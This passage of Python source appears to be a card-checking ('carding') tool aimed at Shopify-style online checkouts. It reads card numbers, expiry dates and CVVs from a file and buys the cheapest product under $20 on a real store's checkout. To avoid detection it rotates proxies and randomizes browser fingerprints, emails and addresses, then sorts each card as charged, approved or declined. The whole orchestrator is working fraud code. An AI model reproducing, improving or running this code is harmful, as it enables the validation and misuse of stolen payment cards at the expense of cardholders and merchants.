                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          {amount_line}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

def proposal5_for_address(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, stable_id: str, variant_id: str, price: str,
                          proposal_id: str, build_id: str, source_token: str, addr_queue_token: str,
                          email: str, addr: Address, currency: str, country: str) -> Tuple[str, Address]:
    _, p3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                 stable_id, variant_id, price, proposal_id, build_id, source_token,
                                 addr_queue_token, email, addr, currency, country)
    q3 = extract_queue_token(p3_body)
    if not q3:
        raise Exception("fallback address: no queueToken after proposal3")
    _, p4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                 stable_id, variant_id, price, proposal_id, build_id, source_token,
                                 q3, email, addr, currency, country)
    q4 = extract_queue_token(p4_body)
    if not q4:
        raise Exception("fallback address: no queueToken after proposal4")
    _, p5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                 stable_id, variant_id, price, proposal_id, build_id, source_token,
                                 q4, email, addr, currency, country)
    return p5_body, addr

# ──────────────────────── Error checking ─────────────────────────────

def check_submit_errors(status: int, body: str):
    if status != 200:
        match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
        if match:
            typename = match.group(1)
            if typename != "SubmitSuccess":
                errors = re.findall(r'"code"\s*:\s*"([^"]+)"', body)
                raise Exception(f"Submit failed with {typename}: {errors if errors else 'Unknown error'}")
        else:
            error_msg = extract_any_error(body)
            if error_msg:
                raise Exception(f"Submit error: {error_msg}")
            else:
                raise Exception(f"Submit returned non-200 status: {status}")

# ──────────────────────── Card and proxy helpers ──────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format in file: {card_entry}")
    
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year in file: {e}")
    
    return card_parts[0], card_month, card_year, card_parts[3]

def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")
    
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    
    return p

# ──────────────────────── Orchestrator ───────────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """Enhanced version with random browser fingerprints and addresses"""
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    
    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR
    )
    
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result
    
    # Generate random email for this checkout
    email = generate_random_email()
    
    # Random browser fingerprint for each attempt
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)
    
    # Create TLS client with curl_cffi
    client = TLSClient(timeout=12, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        currency, country = fetch_shop_currency_sync(client, shop_url)
        result.currency = currency
        # Step 0 - Find cheapest product (0.01$ to 20$): all pages in parallel
        try:
            title, product_id, variant_id, price = find_cheapest_product(
                client, shop_url
            )
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result
        
        # Step 1 - Add to cart and get checkout
        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                try:
                    client.close()
                except Exception:
                    pass
                client = TLSClient(timeout=12, proxy_url=proxy_url)
                checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
                stable_id = extract_stable_id(checkout_html)
                build_id = extract_commit_sha(checkout_html)
                source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                try:
                    with open("/tmp/dump_s1_%d.json" % os.getpid(), "w") as _df:
                        _df.write(checkout_html or "")
                except Exception:
                    pass
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result
        
        # Step 2 - Get private access token
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result
        
        # Step 3 - Get actions JS and extract IDs
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
            if not poll_for_receipt_id:
                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result
        
        # Step 4 - First proposal
        try:
            _, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                              stable_id, variant_id, price, proposal_id, build_id, source_token,
                                              currency, country)
            
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            
            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price
            
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result
        
        # Step 5 - Second proposal with email
        try:
            _, proposal2_body = send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result
        
        # Step 6 - Third proposal with address
        try:
            addr = address_for_country(country)
            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result
        
        # Step 7 - Fourth proposal
        try:
            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result
        
        # Step 8 - Fifth proposal
        try:
            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                               queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result
        
        # Step 9 - PCI Session
        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            
            pci_status, pci_body = send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                     card_month, card_year, card_cvv, site_name, proxy_url)
            _ = pci_status
            
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                result.retryable = True
                raise Exception("could not extract session ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result
        
        # Step 10 - Submit for completion
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital = not extract_is_shipping_required(proposal5_body)

            delivery_handle, dh_shipping = extract_delivery_from_proposal(proposal5_body)
            if not delivery_handle:
                delivery_handle = extract_delivery_handle(proposal5_body)

            shipping_amount = dh_shipping or extract_shipping_amount(proposal5_body)

            if (not delivery_handle or not shipping_amount) and not is_digital:
                for fallback_addr in get_fallback_addresses(country):
                    try:
                        fb_body, fb_addr = proposal5_for_address(
                            client, shop_url, checkout_url, checkout_token, session_token,
                            stable_id, variant_id, price, proposal_id, build_id, source_token,
                            queue_token3, email, fallback_addr, currency, country)
                        fb_is_digital = not extract_is_shipping_required(fb_body)
                        fb_handle, fb_shipping = extract_delivery_from_proposal(fb_body)
                        if not fb_handle:
                            fb_handle = extract_delivery_handle(fb_body)
                        fb_amount = fb_shipping or extract_shipping_amount(fb_body)
                        if fb_is_digital or (fb_handle and fb_amount):
                            proposal5_body, addr = fb_body, fb_addr
                            is_digital      = fb_is_digital
                            delivery_handle = fb_handle
                            shipping_amount = fb_amount
                            queue_token5    = extract_queue_token(proposal5_body)
                            break
                    except Exception:
                        continue

            if not delivery_handle and not is_digital:
                result.retryable = True
                try:
                    with open("/tmp/dump10_%d.json" % os.getpid(), "w") as _df:
                        _df.write(proposal5_body or "")
                except Exception:
                    pass
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)

            if not shipping_amount and not is_digital:
                result.retryable = True
                try:
                    with open("/tmp/dump10_%d.json" % os.getpid(), "w") as _df:
                        _df.write(proposal5_body or "")
                except Exception:
                    pass
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                try:
                    with open("/tmp/step10_%d_%d.json" % (os.getpid(), int(time.time() * 1000)), "w") as _df:
                        _df.write(proposal5_body or "")
                except Exception:
                    pass
                raise Exception("Step 10 failed: could not extract total amount"
                                + (" :: " + proposal5_body[:400] if proposal5_body else ""))
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount
            cover_any = False
            payment_flex = extract_payment_flexibility_template(proposal5_body)

            MAX_TAX_RETRIES = 6
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax,
                    total_any=cover_any,
                    payment_flex_terms_id=payment_flex
                )

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    continue

                if ("WAITING_PENDING_TERMS" in submit_body
                        or "Waiting for pending terms" in submit_body):
                    corr_total, corr_tax = extract_rejected_totals(submit_body)
                    if corr_total and float(corr_total) > 0:
                        current_total = corr_total
                    if corr_tax:
                        current_tax = corr_tax
                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
                    if dh:
                        delivery_handle = dh
                        if dh_ship:
                            shipping_amount = dh_ship
                    signed2 = extract_signed_handles(submit_body)
                    if signed2:
                        signed_handles = signed2
                    time.sleep(extract_pending_poll_delay(submit_body))
                    continue

                if "cannot cover the total amount" in submit_body and not cover_any:
                    corrected_total, corrected_tax = extract_rejected_totals(submit_body)
                    if corrected_total and float(corrected_total) > 0:
                        current_total = corrected_total
                        if corrected_tax:
                            current_tax = corrected_tax
                    else:
                        cover_any = True
                    continue

                # Flow / renegotiation rejection (terms mismatch, delivery
                # changed, …) → refresh the corrected proposal and re-submit.
                flow_code = extract_flow_error(submit_body)
                if flow_code and "cannot cover the total amount" not in submit_body:
                    if "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in flow_code:
                        refreshed = extract_payment_flexibility_template(submit_body)
                        if refreshed:
                            payment_flex = refreshed
                        try:
                            with open("/tmp/submit_flow_%d.json" % os.getpid(), "w") as _ff:
                                _ff.write(submit_body or "")
                        except Exception:
                            pass
                    corr_total, corr_tax = extract_rejected_totals(submit_body)
                    if corr_total and float(corr_total) > 0:
                        current_total = corr_total
                    if corr_tax:
                        current_tax = corr_tax
                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
                    if dh:
                        delivery_handle = dh
                        if dh_ship:
                            shipping_amount = dh_ship
                    signed2 = extract_signed_handles(submit_body)
                    if signed2:
                        signed_handles = signed2
                    time.sleep(extract_pending_poll_delay(submit_body))
                    continue

                break

            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                flow_code = extract_flow_error(submit_body)
                if flow_code:
                    try:
                        with open("/tmp/dump_flow_%d.json" % os.getpid(), "w") as _ff:
                            _ff.write(submit_body or "")
                    except Exception:
                        pass
                    flow_msg = extract_any_error(submit_body)
                    result.status      = CheckStatus.ERROR
                    result.status_code = "REJECTED"
                    result.error       = Exception(
                        f"Checkout renegotiation failed: {flow_code}"
                        + (f" | {flow_msg}" if flow_msg else ""))
                    result.retryable   = True
                    return result
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(keyword in error_msg.lower() for keyword in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal5_body, submit_body)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result
        
        # Step 11 - Poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
        
        for poll_num in range(1, 31):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )
                
                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)
                
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code
                
                # ── Handle ProcessingReceipt ──────────────────────────
                if receipt_type == "ProcessingReceipt":
                    result.status = CheckStatus.APPROVED  # أو CheckStatus.PROCESSING لو ضفته
                    result.status_code = "PROCESSING"
                    result.receipt_url = checkout_url
                    return result
                
                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PAID"
                    try:
                        poll_json = json.loads(poll_body)
                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
                        conf_url = receipt_obj.get("confirmationPage", {}).get("url", "")
                        result.receipt_url = conf_url or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result
                
                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_REQUIRED"
                    return result
                
                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.DECLINED
                        result.error  = Exception("INSUFFICIENT_FUNDS")
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                
                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 300) / 1000.0)
                
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result
        
        result.status = CheckStatus.ERROR
        result.error = Exception("exceeded 30 poll attempts")
        return result
        
    finally:
        client.close()
